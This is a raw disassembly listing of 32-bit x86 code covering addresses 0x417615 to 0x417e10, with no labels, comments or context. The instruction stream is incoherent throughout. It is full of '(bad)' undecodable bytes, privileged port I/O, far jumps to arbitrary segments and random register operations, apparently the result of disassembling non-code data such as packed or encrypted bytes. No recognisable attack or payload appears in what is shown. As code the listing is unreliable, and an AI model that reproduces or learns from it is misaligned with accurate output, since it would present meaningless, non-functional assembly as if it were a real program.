  417615:	pop    es
  417616:	mov    BYTE PTR [edi],cl
  417618:	adc    eax,0x36106afc
  41761d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41761e:	sbb    ch,dh
  417620:	mov    ebx,0x6e3a2c9e
  417625:	pop    es
  417626:	call   ecx
  417628:	lock jbe 0x4175dd
  41762b:	sub    esi,DWORD PTR [esi]
  41762d:	add    BYTE PTR [esi+edx*1],bl
  417630:	pushf  
  417631:	jle    0x41764c
  417633:	jne    0x417653
  417635:	cli    
  417636:	shl    DWORD PTR ds:0x1f8cc619,0x88
  41763d:	jns    0x417696
  41763f:	psraw  mm3,mm1
  417642:	mov    ecx,0xf5c7633a
  417647:	dec    BYTE PTR [edi+0xa4e8718]
  41764d:	int    0x6d
  41764f:	jl     0x417614
  417651:	(bad)  
  417652:	icebp  
  417653:	sbb    eax,0x51227f84
  417658:	ss std 
  41765a:	cld    
  41765b:	in     eax,dx
  41765c:	mov    ebp,0x4bd101cf
  417661:	loope  0x417610
  417663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417664:	aad    0x2c
  417666:	jno    0x417664
  417668:	mov    edi,0xea95d87d
  41766d:	sbb    BYTE PTR [edx+0x20],bl
  417670:	inc    esp
  417671:	pop    es
  417672:	mov    dl,dh
  417674:	push   ebp
  417675:	jmp    0x64ec:0x532557b3
  41767c:	xchg   ecx,eax
  41767d:	mov    edi,0x25a7ad63
  417682:	push   cs
  417683:	dec    esi
  417684:	pusha  
  417685:	mov    DWORD PTR [edi+edi*4],eax
  417688:	fsub   DWORD PTR [esi-0x79992294]
  41768e:	or     DWORD PTR [ebp-0x60],esp
  417691:	xchg   al,dl
  417693:	inc    esi
  417694:	enter  0x1a19,0x73
  417698:	adc    ch,dl
  41769a:	inc    ebx
  41769b:	dec    esp
  41769c:	push   edx
  41769d:	jnp    0x417693
  41769f:	stos   BYTE PTR es:[edi],al
  4176a0:	inc    ebx
  4176a2:	mov    BYTE PTR [eax-0x3a9ae599],al
  4176a8:	mov    BYTE PTR [ebx+ebp*1+0x512f5f12],bh
  4176af:	mov    ebx,0xec355d6d
  4176b4:	(bad)  
  4176b5:	pop    edx
  4176b6:	in     eax,dx
  4176b7:	into   
  4176b8:	test   ebp,0xd0d71ce0
  4176be:	mov    cl,BYTE PTR [ecx]
  4176c0:	pop    esi
  4176c1:	pop    edx
  4176c2:	scas   eax,DWORD PTR es:[edi]
  4176c3:	cmp    eax,0x2ec3ef43
  4176c8:	fadd   st(0),st
  4176ca:	mov    ah,0x6b
  4176cc:	sub    eax,0xe30c4aa
  4176d1:	cmp    bl,BYTE PTR [eax+0x19ce5af2]
  4176d7:	inc    esi
  4176d8:	outs   dx,BYTE PTR ds:[esi]
  4176d9:	inc    edx
  4176da:	daa    
  4176db:	xchg   ebx,eax
  4176dc:	sub    eax,0xc5746ee0
  4176e1:	push   ds
  4176e2:	xchg   DWORD PTR [bp+di+0x18ab],edi
  4176e7:	adc    ecx,DWORD PTR [edx+0x770af87a]
  4176ed:	sbb    bl,BYTE PTR [ebx+0x47cafeb5]
  4176f3:	inc    ecx
  4176f4:	jnp    0x417772
  4176f6:	jbe    0x417689
  4176f8:	add    BYTE PTR [ebp+ebx*4+0x28],ah
  4176fc:	mov    ah,0x2c
  4176fe:	jl     0x4176dd
  417700:	pop    es
  417701:	(bad)  
  417702:	outs   dx,BYTE PTR ds:[esi]
  417703:	add    eax,0x101009a
  417708:	aaa    
  417709:	xchg   edx,eax
  41770a:	sub    BYTE PTR [eax+edi*1],dh
  41770d:	add    ch,0x12
  417710:	dec    esp
  417711:	repz ret 0xc16a
  417715:	mov    esi,0x8cf205d5
  41771a:	or     ebx,DWORD PTR [eax+0x49999e63]
  417720:	or     al,0x69
  417722:	out    0xae,al
  417724:	popa   
  417725:	push   0xffffffcb
  417727:	mov    dl,0xd
  417729:	jl     0x41779c
  41772b:	lds    edx,FWORD PTR [edi+0x7fe2e888]
  417731:	and    eax,0x114acaad
  417736:	outs   dx,DWORD PTR ds:[esi]
  417737:	out    0x76,eax
  417739:	xchg   ecx,eax
  41773a:	inc    ebp
  41773b:	and    BYTE PTR [edi-0x37565d3],ah
  417741:	outs   dx,DWORD PTR ds:[esi]
  417742:	mov    bl,BYTE PTR [edx+0x10]
  417745:	push   edi
  417746:	dec    DWORD PTR [ebp+0x7580cf52]
  41774c:	and    ebx,esi
  41774e:	lahf   
  41774f:	gs push 0x6a
  417752:	outs   dx,BYTE PTR ds:[esi]
  417753:	rol    BYTE PTR [ecx+esi*1],0x58
  417757:	add    dl,al
  417759:	fistp  QWORD PTR [ebp+ecx*8-0x7ea9b1ee]
  417760:	ja     0x4177c0
  417762:	sti    
  417763:	or     edx,DWORD PTR [ebp+0x47]
  417766:	jmp    0x4964:0x5928f85
  41776d:	test   edx,0x74e3b171
  417773:	xchg   DWORD PTR [ecx],edi
  417775:	repz dec edx
  417777:	add    eax,0xef4a0d6c
  41777c:	sub    al,0x6
  41777e:	out    dx,al
  41777f:	out    dx,al
  417780:	es (bad) 
  417782:	int3   
  417783:	sub    eax,esi
  417785:	xor    bl,bl
  417787:	jle    0x4177dd
  417789:	clc    
  41778a:	mov    fs,WORD PTR [edi]
  41778c:	and    ebp,DWORD PTR [ebx+0x2139e9e0]
  417792:	popa   
  417793:	adc    al,0x8c
  417795:	jmp    0x99b5e4e7
  41779a:	mov    DWORD PTR [edi],ebp
  41779c:	lods   eax,DWORD PTR ds:[esi]
  41779d:	lds    edx,FWORD PTR [eax+0x69]
  4177a0:	in     eax,dx
  4177a1:	(bad)  
  4177a2:	mov    WORD PTR ds:0x93b0fe8b,ss
  4177a8:	push   esp
  4177a9:	or     DWORD PTR [edx-0x41],edx
  4177ac:	jecxz  0x41778e
  4177ae:	mov    DWORD PTR [ebx],ecx
  4177b0:	and    bh,BYTE PTR [edi-0x80]
  4177b3:	adc    ch,BYTE PTR [eax-0x5218268e]
  4177b9:	retf   0x7db1
  4177bc:	stc    
  4177bd:	sti    
  4177be:	xchg   ebp,eax
  4177bf:	push   ds
  4177c0:	and    DWORD PTR [ecx+0x41edfbf0],edi
  4177c6:	mov    bl,0x16
  4177c8:	mov    ah,0x6
  4177ca:	jno    0x4177f3
  4177cc:	mov    WORD PTR ds:0x3ec3967f,ds
  4177d2:	xor    al,0x9e
  4177d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177d5:	daa    
  4177d6:	rcl    BYTE PTR [eax],0xa3
  4177d9:	dec    edx
  4177da:	jmp    0x76fe:0x24dd036c
  4177e1:	mov    al,ds:0x6f4f4a19
  4177e6:	xlat   BYTE PTR ds:[ebx]
  4177e7:	jno    0x4177b9
  4177e9:	lods   eax,DWORD PTR ds:[esi]
  4177ea:	lea    esi,[esi-0x75]
  4177ed:	cmp    esi,ecx
  4177ef:	mov    ecx,0x469735f0
  4177f4:	ja     0x417791
  4177f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177f7:	imul   ebp,edi,0xbc6b568a
  4177fd:	mov    WORD PTR [edx+0x6b],?
  417800:	push   0x1b
  417802:	xor    DWORD PTR [esi],edx
  417804:	or     bh,bh
  417806:	call   0x9812:0x34166b2e
  41780d:	xchg   edi,eax
  41780e:	into   
  41780f:	adc    bl,BYTE PTR [eax]
  417811:	sahf   
  417812:	je     0x4177a8
  417814:	xchg   ecx,eax
  417815:	push   ebx
  417816:	lock mov bh,0xcb
  417819:	mov    eax,ds:0x3f738e17
  41781e:	jge    0x417879
  417820:	loop   0x4177fd
  417822:	dec    ebx
  417823:	mov    al,ds:0xe42979c8
  417828:	mov    ch,ah
  41782a:	push   0x6
  41782c:	xor    al,0xf5
  41782e:	xlat   BYTE PTR ds:[ebx]
  41782f:	jmp    0x41781a
  417831:	dec    ebp
  417832:	out    0xc5,eax
  417834:	test   al,0xb6
  417836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417837:	sbb    ch,dl
  417839:	jecxz  0x41780d
  41783b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41783c:	mov    bh,0x76
  41783e:	(bad)  
  41783f:	gs das 
  417841:	cmp    eax,0xf87b1341
  417846:	and    ebp,ebp
  417848:	and    DWORD PTR [ecx+ecx*2+0x77],edx
  41784c:	lods   eax,DWORD PTR ds:[esi]
  41784d:	cdq    
  41784e:	jo     0x417878
  417850:	fs out dx,eax
  417852:	jno    0x4177da
  417854:	loope  0x417801
  417856:	aad    0xaa
  417858:	adc    BYTE PTR ss:[edi+ebx*1-0x6547dbc6],ah
  417860:	push   ecx
  417861:	jecxz  0x4178c0
  417863:	out    0x6e,eax
  417865:	sub    ebp,edi
  417867:	sbb    eax,0x919eb389
  41786c:	mov    ebp,DWORD PTR [edi+0x5c]
  41786f:	call   0x7ebb:0x9a341838
  417876:	adc    eax,0x6a483410
  41787b:	(bad)  
  41787c:	dec    ebx
  41787d:	scas   eax,DWORD PTR es:[edi]
  41787e:	je     0x417848
  417880:	mov    edi,0x2cc98564
  417885:	or     BYTE PTR [esi+edx*1-0x78],0x42
  41788a:	jge    0x4178d0
  41788c:	sti    
  41788d:	aaa    
  41788e:	ss push 0x782008e1
  417894:	sub    al,0xf4
  417896:	mov    cs,eax
  417898:	cmp    al,0x2d
  41789a:	inc    eax
  41789b:	push   esi
  41789c:	test   eax,0xd6c3b35e
  4178a1:	inc    ebp
  4178a2:	mov    eax,ds:0x58c08c35
  4178a7:	lods   eax,DWORD PTR ds:[esi]
  4178a8:	jmp    0x525:0x4cca5462
  4178af:	dec    edx
  4178b0:	pop    ebp
  4178b1:	loopne 0x417851
  4178b3:	enter  0x8331,0xcd
  4178b7:	cmp    BYTE PTR [ecx],cl
  4178b9:	jns    0x417924
  4178bb:	(bad)
  4178be:	sub    DWORD PTR [ebx],ebp
  4178c0:	out    0x3d,eax
  4178c2:	mov    eax,ds:0xe489def7
  4178c7:	scas   al,BYTE PTR es:[edi]
  4178c8:	or     DWORD PTR [esi-0x46],0x26046f5a
  4178cf:	mov    ecx,0x4c34a4d1
  4178d4:	pop    esi
  4178d5:	push   ss
  4178d6:	add    DWORD PTR [edx+0x673aed61],edx
  4178dc:	cmp    DWORD PTR [ebx-0x5ac8eff2],ebx
  4178e2:	ins    BYTE PTR es:[edi],dx
  4178e3:	je     0x4178f5
  4178e5:	cmc    
  4178e6:	cmp    BYTE PTR [esp+edi*4-0x55afde7],0xc
  4178ee:	lods   al,BYTE PTR ds:[esi]
  4178ef:	sbb    BYTE PTR [ecx],ah
  4178f1:	fcomp  QWORD PTR [edi-0x36363f81]
  4178f7:	xchg   BYTE PTR [eax-0x6994bc7b],dl
  4178fd:	xor    BYTE PTR [eax+0x1e791a5],al
  417903:	and    al,0xf9
  417905:	sbb    ebx,eax
  417907:	(bad)  
  417908:	nop
  417909:	add    al,0xeb
  41790b:	and    DWORD PTR [ecx-0xa],ebp
  41790e:	mov    ebp,0x44c0cb31
  417913:	stos   BYTE PTR es:[edi],al
  417914:	push   cs
  417915:	or     edi,DWORD PTR [eax]
  417917:	jno    0x41791b
  417919:	push   esi
  41791a:	mov    bl,0xcf
  41791c:	cdq    
  41791d:	lods   eax,DWORD PTR ds:[esi]
  41791e:	xor    eax,0xc91bf274
  417923:	sbb    BYTE PTR ds:0x2e6c08ce,0x3f
  41792a:	cmp    BYTE PTR [ebp-0x5e66de70],0xd1
  417931:	out    0x70,eax
  417933:	inc    edi
  417934:	mov    ds,eax
  417936:	add    BYTE PTR [esi],al
  417938:	jmp    0x41790e
  41793a:	xor    al,ah
  41793c:	jl     0x4178ca
  41793e:	sbb    eax,ebp
  417940:	sbb    al,0xf3
  417942:	mov    al,BYTE PTR [ebp+0x59]
  417945:	push   es
  417946:	mov    eax,ds:0x5976d885
  41794b:	or     eax,esi
  41794d:	lods   eax,DWORD PTR ds:[esi]
  41794e:	sub    ecx,edx
  417950:	xor    eax,0x32a8e723
  417955:	fisubr DWORD PTR [edi-0x4b540de6]
  41795b:	dec    ecx
  41795c:	add    ecx,DWORD PTR [ebx-0x4c]
  41795f:	adc    BYTE PTR [eax+0x60],dl
  417962:	jmp    0x53eff94f
  417967:	dec    ecx
  417968:	rcr    BYTE PTR [ebp-0x6b],1
  41796b:	mov    edx,0x6a015d79
  417970:	ror    BYTE PTR [ecx+0x76],cl
  417973:	push   ecx
  417974:	in     eax,0xad
  417976:	push   edx
  417977:	mov    cl,0xf0
  417979:	ins    BYTE PTR es:[edi],dx
  41797a:	jno    0x4179e5
  41797c:	jge    0x417974
  41797e:	(bad)  
  41797f:	in     eax,0x6b
  417981:	or     al,0x7e
  417983:	adc    eax,0x6104021f
  417988:	jns    0x417954
  41798a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41798b:	sub    al,BYTE PTR [edx-0x6c]
  41798e:	mov    esp,0x3b2f57aa
  417993:	aam    0x34
  417995:	cmp    BYTE PTR [edi-0x4],cl
  417998:	clc    
  417999:	adc    edx,ecx
  41799b:	test   DWORD PTR [ecx],ecx
  41799d:	and    edx,edi
  41799f:	in     eax,dx
  4179a0:	inc    edi
  4179a1:	mov    edi,fs
  4179a3:	xchg   DWORD PTR [esi+0x566ed7a],ebp
  4179a9:	and    BYTE PTR [eax],al
  4179ab:	xor    al,0x66
  4179ad:	and    edi,ebx
  4179af:	mov    cl,0x6e
  4179b1:	(bad)  
  4179b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179b3:	repz cmp eax,0xa99c20aa
  4179b9:	cmp    eax,0xb56d0b63
  4179be:	mov    bl,0xa4
  4179c1:	xor    eax,0x6b729e26
  4179c6:	sti    
  4179c7:	xchg   esi,eax
  4179c8:	dec    eax
  4179c9:	sbb    eax,0x34dcef2f
  4179ce:	fucompp 
  4179d0:	mov    ds:0x20dfe1d3,al
  4179d5:	scas   al,BYTE PTR es:[edi]
  4179d6:	cld    
  4179d7:	add    DWORD PTR [ecx+0x7d],esp
  4179da:	cmp    esp,eax
  4179dc:	xlat   BYTE PTR ds:[ebx]
  4179dd:	mov    edx,DWORD PTR [edx+0x1fac9a3f]
  4179e3:	cs inc edi
  4179e5:	out    0x13,al
  4179e7:	fadd   QWORD PTR [ebp+0x57]
  4179ea:	jmp    0xa851:0x84aa97f5
  4179f1:	mov    ds:0x4c1ce901,eax
  4179f6:	outs   dx,BYTE PTR ds:[esi]
  4179f7:	(bad)  
  4179f9:	mov    eax,ds:0xb20a7a8c
  4179fe:	and    eax,0xf4f67155
  417a03:	sbb    al,0xb2
  417a05:	adc    DWORD PTR [edx-0x7],ebp
  417a08:	jl     0x417a0b
  417a0a:	jecxz  0x4179e1
  417a0c:	xchg   bl,ah
  417a0e:	xchg   esp,eax
  417a0f:	lds    edi,FWORD PTR [ebx+0x2d]
  417a12:	mov    bl,0x71
  417a14:	fild   DWORD PTR [edx+0x17cdcf1e]
  417a1a:	or     BYTE PTR [ebp+0x33],dl
  417a1d:	cmp    ecx,0xf064e714
  417a23:	jnp    0x417a56
  417a25:	cs push es
  417a27:	mov    cl,0x18
  417a29:	fs inc ebx
  417a2b:	test   al,0xf3
  417a2d:	sahf   
  417a2e:	inc    edx
  417a2f:	mov    BYTE PTR [ebp+0x2824ee68],bh
  417a35:	imul   ebp,DWORD PTR [esp+eiz*8+0x58bfdcc4],0x2e
  417a3d:	jp     0x417a2f
  417a3f:	hlt    
  417a40:	jge    0x417a50
  417a42:	ret    
  417a43:	fidiv  WORD PTR [ecx+0x1]
  417a46:	xor    ebx,DWORD PTR [ebx]
  417a48:	mov    eax,0xcbfa7db
  417a4d:	xchg   BYTE PTR [eax+0x4d0dbfda],cl
  417a53:	pushf  
  417a54:	std    
  417a55:	paddd  mm2,QWORD PTR [edx+eax*8+0x5eaf77e4]
  417a5d:	(bad)  
  417a5e:	adc    edi,DWORD PTR [edi+0x88211e1]
  417a64:	xor    dl,BYTE PTR [esi]
  417a66:	sub    eax,0xd13e8455
  417a6b:	push   esi
  417a6c:	mov    ds:0x7a8fd400,al
  417a71:	inc    ecx
  417a72:	add    DWORD PTR [ecx-0x41d3705f],esp
  417a78:	out    0xc2,al
  417a7a:	sbb    eax,esi
  417a7c:	jnp    0x417a84
  417a7e:	test   BYTE PTR [ecx-0x38],bl
  417a81:	test   BYTE PTR [esi],0x6e
  417a84:	test   al,0x6a
  417a86:	push   ebp
  417a87:	popf   
  417a88:	enter  0x7c76,0xd5
  417a8c:	jb     0x417a24
  417a8e:	inc    ebx
  417a8f:	mov    cl,0x49
  417a91:	ret    
  417a92:	ret    0xe85d
  417a95:	out    dx,eax
  417a96:	fisttp WORD PTR [edi-0x4a]
  417a99:	mov    ch,0xcb
  417a9b:	repnz mov edi,0x2d3e2fc1
  417aa1:	lods   al,BYTE PTR ds:[esi]
  417aa2:	aas    
  417aa3:	mov    ds:0x19ee9a33,eax
  417aa8:	and    eax,0x4d262da8
  417aad:	inc    eax
  417aae:	clc    
  417aaf:	daa    
  417ab0:	jnp    0x417a48
  417ab2:	leave  
  417ab3:	cwde   
  417ab4:	inc    eax
  417ab5:	(bad)  
  417ab6:	call   0x50b5:0x82db9159
  417abd:	in     eax,dx
  417abe:	and    bh,BYTE PTR [ebx-0xd]
  417ac1:	mov    ebx,0xccf7326b
  417ac6:	mov    ah,0x80
  417ac8:	sbb    ecx,edx
  417aca:	cmp    ch,BYTE PTR [ebx]
  417acc:	out    0xf1,al
  417ace:	cld    
  417acf:	jnp    0x417b34
  417ad1:	jo     0x417ab9
  417ad3:	add    BYTE PTR [ecx+0x43],bl
  417ad6:	fiadd  DWORD PTR [edi-0x56]
  417ad9:	outs   dx,DWORD PTR ds:[esi]
  417ada:	mov    ah,0x24
  417adc:	mov    eax,ds:0x688621bb
  417ae1:	shl    BYTE PTR [ebp+0x5d2edb4e],0x23
  417ae8:	out    dx,al
  417ae9:	aaa    
  417aea:	or     eax,0x5a47fa0d
  417aef:	add    al,0x92
  417af1:	fstp   QWORD PTR [eax-0x1b06f3c6]
  417af7:	stc    
  417af8:	and    al,0xce
  417afa:	xor    edi,DWORD PTR [ebx]
  417afc:	inc    esi
  417afd:	cwde   
  417afe:	imul   eax,DWORD PTR [eax+0x5326052d],0xfffffffc
  417b05:	stos   BYTE PTR es:[edi],al
  417b06:	sub    ch,bh
  417b08:	cmp    BYTE PTR [eax-0x6d],al
  417b0b:	repz neg BYTE PTR [edx+0x5a]
  417b0f:	push   ebp
  417b10:	push   0xfffffffc
  417b12:	data16 sub BYTE PTR [eax+ebp*8+0x3d246e4],0xba
  417b1b:	and    al,dh
  417b1d:	cld    
  417b1e:	out    0xc,eax
  417b20:	xchg   esi,eax
  417b21:	nop
  417b22:	inc    ebp
  417b23:	and    DWORD PTR [edi-0x744fbed],ecx
  417b29:	push   0x50
  417b2b:	test   BYTE PTR [ecx+ebx*8-0x48],dh
  417b2f:	xchg   ebx,eax
  417b30:	or     eax,ecx
  417b32:	popf   
  417b33:	jl     0x417b09
  417b35:	sub    BYTE PTR [edi+0x45],0xa
  417b39:	call   0xb3093cd1
  417b3e:	mov    esi,?
  417b40:	mov    BYTE PTR [ebp-0x7e],al
  417b43:	dec    esp
  417b44:	inc    esp
  417b45:	fscale 
  417b47:	(bad)  
  417b48:	mov    ds:0xb97c41c1,eax
  417b4d:	adc    edx,DWORD PTR [ebp+0x6a18bd21]
  417b53:	(bad)  
  417b54:	je     0x417b4b
  417b56:	out    dx,eax
  417b57:	and    BYTE PTR gs:[ebx],dh
  417b5a:	mov    ecx,0x3ca38d0b
  417b5f:	dec    edi
  417b60:	jp     0x417b92
  417b62:	cmp    eax,0xded1731c
  417b67:	add    esi,DWORD PTR [edx]
  417b69:	cld    
  417b6a:	sub    DWORD PTR [esi-0x1b],ecx
  417b6d:	adc    al,ch
  417b6f:	loopne 0x417b30
  417b71:	iret   
  417b72:	mov    dh,0xb0
  417b74:	fmul   DWORD PTR [ebx-0x167e49b3]
  417b7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b7b:	aad    0xc8
  417b7d:	push   0x107530e4
  417b82:	in     al,dx
  417b83:	(bad)  
  417b84:	into   
  417b85:	lds    ecx,FWORD PTR [ecx+0x4]
  417b88:	push   ecx
  417b89:	js     0x417b9d
  417b8b:	push   cs
  417b8c:	jne    0x417b14
  417b8e:	push   cs
  417b8f:	imul   ebx,eax,0x79
  417b92:	add    BYTE PTR [edi-0xbe61d03],ah
  417b98:	and    BYTE PTR [edi-0x1f8736cb],bh
  417b9e:	mov    WORD PTR [eax-0x72],gs
  417ba1:	pusha  
  417ba2:	jmp    DWORD PTR [edx+edi*1]
  417ba5:	and    DWORD PTR [ebx+0x28],esi
  417ba8:	adc    eax,DWORD PTR [ecx+0x40871ebb]
  417bae:	xchg   BYTE PTR [ecx+0x2b0ceb71],dh
  417bb4:	xor    dh,BYTE PTR [ebx]
  417bb6:	xchg   BYTE PTR [edi+0x19353231],bh
  417bbc:	add    al,bl
  417bbe:	push   esi
  417bbf:	pop    ds
  417bc0:	shl    BYTE PTR [edx+0x2b26e3c6],1
  417bc6:	pop    esi
  417bc7:	aad    0x41
  417bc9:	mov    dl,0xb6
  417bcb:	scas   eax,DWORD PTR es:[edi]
  417bcc:	jp     0x417b92
  417bce:	mov    dl,0x38
  417bd0:	clc    
  417bd1:	sbb    eax,0xbe68ec21
  417bd6:	xor    ebx,esi
  417bd8:	leave  
  417bd9:	and    DWORD PTR [edx-0xc3b34ca],0x1bbdfe3e
  417be3:	leave  
  417be4:	push   0xd199b3df
  417be9:	(bad)  
  417bea:	mov    al,ds:0x69669fa3
  417bef:	(bad)  
  417bf0:	and    DWORD PTR [edi+0x42],esi
  417bf3:	fnstsw WORD PTR [ebx+0x19ce74eb]
  417bf9:	xchg   ebx,eax
  417bfa:	ins    BYTE PTR es:[edi],dx
  417bfb:	mov    dh,0x61
  417bfd:	mov    dh,0x83
  417bff:	js     0x417c03
  417c01:	gs (bad) 
  417c04:	sub    eax,DWORD PTR [eax]
  417c06:	jecxz  0x417bb6
  417c08:	lahf   
  417c09:	mov    dh,0x1a
  417c0b:	or     al,0xa1
  417c0d:	scas   al,BYTE PTR es:[edi]
  417c0e:	pop    ebp
  417c0f:	inc    esp
  417c10:	add    DWORD PTR [esi],edi
  417c12:	mov    bh,0x73
  417c14:	cmp    eax,0x45e1b6c9
  417c19:	mov    edi,0x8024eff4
  417c1e:	xchg   esp,eax
  417c1f:	or     eax,0xe49eac96
  417c24:	mov    edx,0x497537f9
  417c29:	xchg   BYTE PTR [eax-0x7d],dl
  417c2c:	scas   al,BYTE PTR es:[edi]
  417c2d:	mov    bh,0xc3
  417c2f:	(bad)  
  417c31:	and    BYTE PTR [esi+0x1cc99848],dl
  417c37:	dec    DWORD PTR [eax-0x3cf2dff3]
  417c3d:	in     eax,0x5d
  417c3f:	add    al,0x75
  417c41:	pop    esp
  417c42:	inc    esi
  417c43:	out    0x7e,eax
  417c45:	adc    al,0xf2
  417c47:	jecxz  0x417c0b
  417c49:	jle    0x417cbb
  417c4b:	aaa    
  417c4c:	test   BYTE PTR [ebx+0x52],al
  417c4f:	adc    BYTE PTR [ebx+0x27],bl
  417c52:	sub    al,0x5e
  417c54:	and    ebp,esi
  417c56:	xchg   ecx,eax
  417c57:	pop    es
  417c58:	aas    
  417c59:	stos   BYTE PTR es:[edi],al
  417c5a:	shr    bl,1
  417c5c:	dec    edi
  417c5d:	cs (bad) 
  417c5f:	fldenv [edx+0x2a]
  417c62:	inc    esp
  417c63:	and    ecx,edi
  417c65:	push   ebx
  417c66:	cmp    ecx,esp
  417c68:	xchg   ecx,eax
  417c69:	loope  0x417ce0
  417c6b:	push   eax
  417c6c:	std    
  417c6d:	cs cmp eax,0xe3c21f93
  417c73:	jp     0x417cbd
  417c75:	add    edx,DWORD PTR [ebx]
  417c77:	lods   al,BYTE PTR ds:[esi]
  417c78:	dec    DWORD PTR [esi-0x71]
  417c7b:	fwait
  417c7c:	stos   BYTE PTR es:[edi],al
  417c7d:	sbb    BYTE PTR [ebx],dh
  417c7f:	or     eax,0x9f4ae3b5
  417c84:	and    DWORD PTR [ecx+0x2a33c5e0],esp
  417c8a:	and    eax,0xf2460b37
  417c8f:	arpl   sp,sp
  417c91:	lds    ebp,FWORD PTR [esi+0x1920b8e]
  417c97:	lods   eax,DWORD PTR ds:[esi]
  417c98:	mov    dl,0x1b
  417c9a:	stos   DWORD PTR es:[edi],eax
  417c9b:	dec    ebp
  417c9c:	or     ch,BYTE PTR [ebp-0x3a04ef49]
  417ca2:	mov    edx,0x5acab438
  417ca7:	sub    eax,0xd3f4f586
  417cac:	mov    edi,eax
  417cae:	dec    esi
  417caf:	mov    edi,0x6c3f441d
  417cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cb5:	mov    ch,0x9f
  417cb7:	xor    dh,BYTE PTR [edx-0x35]
  417cba:	test   al,0xc3
  417cbc:	sbb    eax,0xf9cdc46b
  417cc1:	jo     0x417ca4
  417cc3:	add    al,0x8d
  417cc5:	fmulp  st(6),st
  417cc7:	mov    ebx,0xce679eb2
  417ccc:	xor    ecx,DWORD PTR [edi-0x2e9405fe]
  417cd2:	fwait
  417cd3:	dec    esp
  417cd4:	mov    eax,ds:0xc6b16839
  417cd9:	rol    BYTE PTR [edi+0x3a],0xfc
  417cdd:	sbb    eax,0x646448f2
  417ce2:	xor    dl,dh
  417ce4:	sbb    ebp,DWORD PTR [edx-0xeea244c]
  417cea:	dec    edi
  417ceb:	sbb    BYTE PTR [edx+edx*8+0x2e],al
  417cef:	jne    0x417cc9
  417cf1:	cmp    DWORD PTR [ebx+0x63a2dbcb],eax
  417cf7:	mov    ebx,0xcee11f2b
  417cfc:	jmp    0x417c9a
  417cfe:	(bad)  
  417cff:	into   
  417d00:	jmp    0x4ffbae74
  417d05:	(bad)  
  417d06:	add    ebp,edi
  417d08:	fwait
  417d09:	lods   al,BYTE PTR ds:[esi]
  417d0a:	das    
  417d0b:	and    dl,0x72
  417d0e:	pop    ecx
  417d0f:	mov    ds:0xfde4046a,al
  417d14:	loope  0x417d2d
  417d16:	mov    ebp,DWORD PTR ds:0x43cbf918
  417d1c:	sub    ecx,DWORD PTR [eax+0x42ac5ae9]
  417d22:	pop    edx
  417d23:	gs xchg ebp,eax
  417d25:	test   al,0x8f
  417d27:	adc    BYTE PTR [eax],ah
  417d29:	es inc esi
  417d2b:	ins    DWORD PTR es:[edi],dx
  417d2c:	and    ecx,DWORD PTR [edi]
  417d2e:	dec    edi
  417d2f:	cdq    
  417d30:	sub    DWORD PTR [ebp+eiz*1+0x3f01a4ee],esp
  417d37:	jae    0x417d41
  417d39:	lahf   
  417d3a:	dec    ebx
  417d3b:	frstor ds:0x7d6afb03
  417d41:	clc    
  417d42:	jne    0x417db0
  417d44:	sbb    ebx,DWORD PTR [edx-0x1f]
  417d47:	in     al,dx
  417d48:	fsub   DWORD PTR [edi]
  417d4a:	push   0xffffffbd
  417d4c:	shr    ebx,cl
  417d4e:	jg     0x417d4a
  417d50:	push   0xe239b35f
  417d55:	pop    ecx
  417d56:	(bad)  
  417d57:	fidivr WORD PTR [edx]
  417d59:	and    BYTE PTR [edx-0x54],ah
  417d5c:	loope  0x417d99
  417d5e:	repnz xchg edx,eax
  417d60:	or     al,0x39
  417d62:	xor    DWORD PTR [ebp-0x64381646],0xf6467ad0
  417d6c:	ror    DWORD PTR [edx-0x2c9aca44],cl
  417d72:	sbb    ebp,DWORD PTR [eax+0x2d]
  417d75:	stos   BYTE PTR es:[edi],al
  417d76:	std    
  417d77:	bound  ecx,QWORD PTR [esi]
  417d79:	cli    
  417d7a:	cmp    esp,DWORD PTR [edi+0x32]
  417d7d:	mov    ebx,0x6884b036
  417d82:	fdiv   DWORD PTR [edx+ebx*1]
  417d85:	stos   BYTE PTR es:[edi],al
  417d86:	jmp    0xa8faaa9a
  417d8b:	xor    eax,0x178a0ec2
  417d90:	(bad)  [eax+0x232732c1]
  417d96:	push   eax
  417d97:	jb     0x417de0
  417d99:	xor    dl,BYTE PTR [edx-0x1877e162]
  417d9f:	repz sub ebx,DWORD PTR [esi]
  417da2:	cmp    eax,0xf3479ee7
  417da7:	push   0x98ff0988
  417dac:	mov    BYTE PTR ds:0x5b3a4efe,bh
  417db2:	cmc    
  417db3:	add    ebx,DWORD PTR [ebp+0x2c]
  417db6:	sbb    BYTE PTR [eax-0x1901eaa8],dl
  417dbc:	cdq    
  417dbd:	test   al,0x9a
  417dbf:	and    DWORD PTR [ebp-0x4c],eax
  417dc2:	inc    ecx
  417dc3:	add    edx,esp
  417dc5:	jl     0x417de9
  417dc7:	pop    ss
  417dc8:	sbb    ah,BYTE PTR [ebx+0x56]
  417dcb:	retf   0xdf98
  417dce:	sbb    al,0x6f
  417dd0:	ins    DWORD PTR es:[edi],dx
  417dd1:	fwait
  417dd2:	bound  eax,QWORD PTR [edi]
  417dd4:	test   BYTE PTR [ecx-0x6b9cc5c3],dl
  417dda:	cmp    ebp,eax
  417ddc:	hlt    
  417ddd:	mov    dh,0x2
  417ddf:	(bad)  
  417de0:	fisttp WORD PTR [ecx*8+0x69c441ee]
  417de7:	scas   eax,DWORD PTR es:[edi]
  417de8:	sbb    bh,BYTE PTR [ebp-0x37]
  417deb:	jmp    0x87b9:0xb1f9897f
  417df2:	adc    bl,dl
  417df4:	pop    ebp
  417df5:	mov    al,ds:0x5d361461
  417dfa:	xor    ch,BYTE PTR [esi+0x1f989926]
  417e00:	sub    dl,BYTE PTR [ebp+0x50]
  417e03:	hlt    
  417e04:	adc    ah,BYTE PTR [edx-0x374c979f]
  417e0a:	mov    eax,DWORD PTR [esi+0x6a245004]
  417e10:	sbb    ebp,DWORD PTR [edx+ebp*1-0x7c]
